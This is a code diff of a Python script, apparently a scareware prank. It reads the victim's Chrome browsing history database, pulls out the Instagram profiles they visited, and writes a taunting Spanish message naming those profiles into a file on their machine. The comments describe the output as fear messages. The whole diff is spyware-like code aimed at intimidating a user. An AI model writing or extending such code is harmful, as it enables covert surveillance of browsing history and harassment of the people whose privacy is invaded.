@@ -3,7 +3,7 @@ from pathlib import Path
 from random import randrange
 from time import sleep
 import sqlite3
-
+import re 
 HACKER_FILE_NAME = "Pruebameeee.txt"
 
 
@@ -43,9 +43,14 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
-def check_history_and_write(hacker_file,chrome_history):
-    for items in chrome_history [:10]:
-        hacker_file.write("He visto que has visitado la web de {}, interesante...\n".format(items[0]))
+def check_history_instagram_profiles(hacker_file,chrome_history):
+    profiles_visited = []
+    for items in chrome_history:
+        results = re.findall("https://www.instagram.com/([A-Za-z0-9_.-]+)/+$",items[2])
+        if results and results[0] not in ["fer_leonfranco"]:  #FILTRO
+            profiles_visited.append(results[0])
+    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
+            
 
 
 def main():
@@ -58,7 +63,7 @@ def main():
     #Recojemos el historial de google chrome, mientras este se pueda
     chrome_history= get_chrome_history(user_path)
     #Excribiendo mensajes de miedo
-    check_history_and_write(hacker_file,chrome_history)
+    check_history_instagram_profiles(hacker_file,chrome_history)
     
 
 if __name__ == "__main__":
